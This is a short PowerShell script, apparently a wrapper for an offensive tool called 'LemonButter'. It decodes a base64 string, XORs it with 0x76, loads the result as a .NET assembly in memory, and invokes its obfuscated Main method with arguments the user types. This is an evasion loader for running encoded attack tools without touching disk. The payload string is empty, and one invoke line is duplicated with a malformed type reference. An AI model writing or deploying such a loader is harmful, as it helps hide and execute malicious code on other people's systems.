$ad0fe8d7 = ""
function Load-LemonButter {
$fb = [Convert]::FromBase64String($ad0fe8d7)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor 0x76}
[System.Reflection.Assembly]::Load($fb)
}
$asm = Load-LemonButter
function Invoke-LemonButter { param([Parameter ()] $Args = "")
$Args -eq "" -and ($Args = Read-Host "Specify command arguments")
$asm.GetType("Pzsnowto.Program", [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))
$asm.GetType([Pzsnowto.Program], [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, $Args.split()))
}
Invoke-LemonButter
